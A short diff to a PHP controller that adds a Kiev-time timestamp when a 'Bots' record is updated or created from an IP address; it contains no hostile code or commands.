@@ -338,10 +338,12 @@ class CommandController extends Controller
             $bot->bot_status = $status;
             $bot->life       = 1;
             $bot->otk        = 0;
+            $bot->time  = Carbon::now('Europe/Kiev');
             $bot->save();
         } else {
             Bots::create([
                 'ip' => $ip,
+                'time' => Carbon::now('Europe/Kiev'),
             ]);
         }
     }
